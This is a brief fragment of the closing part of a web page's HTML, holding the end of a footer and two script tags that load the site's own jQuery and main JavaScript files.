  </footer><br><br>

<script type="text/javascript" src="/js/jquery.min.js"></script>
<script type="text/javascript" src="/js/main.js?1678894953382991917"></script>

    </div>
  </body>
</html>
